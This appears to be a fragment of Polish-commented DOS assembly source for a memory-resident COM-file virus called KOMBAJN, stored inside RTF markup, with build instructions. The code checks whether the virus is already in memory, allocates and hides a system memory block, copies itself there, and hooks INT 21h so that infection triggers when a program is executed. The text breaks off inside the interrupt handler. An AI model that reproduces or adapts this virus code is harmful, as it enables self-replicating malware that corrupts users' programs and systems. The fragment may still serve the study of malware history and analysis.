\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Infekuje pliki z atrybutem Archive, ReadOnly, System, Hidden  ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Przejmuje przerwanie 21h                                      ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Przejmuje przerwanie 24h na czas infekcji                     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM     KOMBAJN.ASM                                           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK /t KOMBAJN.OB J                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JUMPS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KOMBAJN SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         ASSUME CS:KOMBAJN, DS:KOMBAJN}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         ORG 100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Haslo     = 0BACAh                    ; \\ do sprawdzenia, czy wirus jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Odpowiedz = 0CABAh                    ; / juz zainstalowany w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            NUL = 00h                       ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            LF  = 0Ah                       ;  - stale znakow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            CR  = 0Dh                       ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrReadOnly  = 00000001b                 ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrHidden    = 00000010b                 ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrSystem    = 00000100b                 ;   \\ rozne stale atrybutow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrVolumeID  = 00001000b                 ;   / pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrDirectory = 00010000b                 ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   AtrArchive   = 00100000b                 ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VRok          = 1998                       ; \\  data opisujaca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VMiesiac      = 13                         ;  - pliki juz zainfekowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VDzien        = 31                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VZnacznik     = (VRok-1980)*512+VMiesiac*32+VDzien}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DlugoscWirusa = (Offset KoniecWirusa-Offset PoczatekWirusa)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DlugoscWPamieci = (DlugoscWirusa +31)/16}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Start:                                     ; poczatek wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PoczatekWirusa:                            ; pomocnicza etykieta}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Trik                             ; zapisz na stosie relatywny ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Trik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   si                               ; zdejmij ze stosu relatywny ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   si,103h                          ; oblicz ofset do poczatku wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,Haslo                         ; \\ sprawdz, czy wirus jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; / juz w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,Odpowiedz                     ; \\ czy kopia wirusa odpowiedziala ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   InstalacjaWPamieci               ; / NIE - zainstaluj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; TAK - wypisz komunikat}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeBylZainstalowany            ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     call  DrukSI                           ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   PowrocDoNosiciela                ; i powroc do nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch InstalacjaWPamieci:                        ; poczatek instalacji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeCopyRight                   ; \\ wyswietl info o wirusie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  DrukSI                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeInstalacja                  ; \\  zapytaj uzytkownika, czy chce}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  DrukSI                           ;  \\ zainstalowac wirusa w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Decyzja                          ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PowrocDoNosiciela                ; / CF=1 - uzytkownik nie chce instalowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,3521h                         ; funkcja DOS - wez adres INT 21}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][Stare21Seg],es              ; \\ zachowaj adres (wirus bedzie go}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][Stare21Ofs],bx              ; / uzywal)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,ds                            ; przywroc ES}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   es,ax                            ; AX=ES=DS=CS=SS=PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     dec   ax                               ; AX=ES-1=MCB do aktualnego bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,ax                            ; DS=blok MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   bx,word ptr ds:[0003h]           ; wez dlugosc aktualnego bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   bx,DlugoscWPamieci+1             ; zmniejsz go o dlugosc wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,4Ah                           ; funkcja DOS - zmien rozmiar bloku pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   bx,DlugoscWPamieci               ; podaj dlugosc wymaganego bloku pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,48h                           ; funkcja DOS - przydzial bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PowrocDoNosiciela                ; CF=1 - nie udalo sie przydzielic}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   es,ax                            ; ES=wskazuje na przydzielony blok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   di,di                            ; ES:DI - dokad skopiwoac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cld                                    ; zwiekszaj SI, DI w REP MOVSB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  si                               ; SI bedzie zmieniany, wiec zachowaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   si,offset PoczatekWirusa         ; dodaj ofset : skad kopiowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,DlugoscWirusa                 ; cx=ile bajtow kopiowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     rep   movs byte ptr es:[di], cs:[si]   ; kopiuj z CS:SI do ES:DI, CX bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   si                               ; przywroc relatywny ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,es                            ; pobierz adres do MCB opisujacego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     dec   ax                               ; blok, w ktorym jest wirus}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,ax                            ; DS=MCB wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   word ptr ds:[0001h],0008h        ; ustaw MCB wirusa, jako systemowy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   ax,0Fh                           ; \\  DS=adres bloku-10h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,ax                            ;  \\ sztuczka, dzieki ktorej mozna}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;  / odwolywac sie do danych jak w}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; /  zwyklym programie COM (ORG 100h)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,Offset NoweInt21              ; DX=adres do nowej procedury INT 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,25FFh                         ; funkcja DOS - ustaw adres INT 21}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs                               ; \\   wyswietl komunikat o}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds                               ;  \\  instalacji w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,TeZainstalowany               ;   \\ i segment, w ktorym}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  DrukSI                           ;   / rezyduje wirus}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov  ax,es                             ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call DrukHEX16                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PowrocDoNosiciela:                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs cs                            ; \\ przywroc DS=ES=CS=PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds es                            ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   al,byte ptr [si][StareBajty]     ; \\  przywroc 3 poczatkowe bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds:[100h],al                     ;  \\ programu pod adresem CS:100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][StareBajty+1]   ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds:[101h],ax                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,100h                          ; \\ zachowaj na stosie slad do}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax                               ; / adresu 100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   ax,ax                            ; \\   dla bezpieczenstwa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   bx,bx                            ;  \\  lepiej wyzerowac rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ;   \\ robocze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   si,si                            ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   di,di                            ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powroc do nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PytanieOInstalacje:                        ; \\   odpowiedz rezydujacego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xchg  al,ah                            ;   - wirusa na pytanie, czy jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     iret                                   ; /   w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweInt21:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,4B00h                         ; czy funkcja DOS - uruchom program ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    InfekcjaPliku                    ; TAK - sprobuj infekowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,Haslo                         ; czy pytanie wirusa o instalacje ?}{\f2\fs24\lang1045{\*\listtag0}\par}
